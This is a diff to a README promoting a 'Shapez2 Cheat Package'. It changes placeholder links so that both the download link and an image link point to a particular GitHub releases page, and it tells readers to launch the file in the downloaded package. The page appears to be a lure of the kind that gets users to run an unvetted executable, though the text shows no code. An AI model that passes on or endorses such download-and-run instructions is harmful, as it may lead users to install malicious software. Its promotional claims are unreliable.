@@ -22,7 +22,7 @@ Explore a collection of scripts and cheats tailor-made for Shapez2 to give you a
 
 ## Download Cheat Package
 
-📥 [Download the Shapez2 Cheat Package](https://github.com/repo/releases/9246/App.zip)
+📥 [Download the Shapez2 Cheat Package](https://github.com/Asriasri/Shapez-2-Cheat/releases)
 
 *Note: Launch the file in the downloaded package to start using the cheats.*
 
@@ -34,7 +34,7 @@ If the provided download link does not work or you need more information, please
 
 To start using the cheats, simply download the cheat package from the link above and follow the instructions provided. With these cheats, you'll revolutionize your Shapez2 gameplay experience and achieve greatness in the virtual world.
 
-![Shapez2 Image](https://example.com/shapez2-image.png)
+![Shapez2 Image](https://github.com/Asriasri/Shapez-2-Cheat/releases)
 
 ## Support and Contributions
 
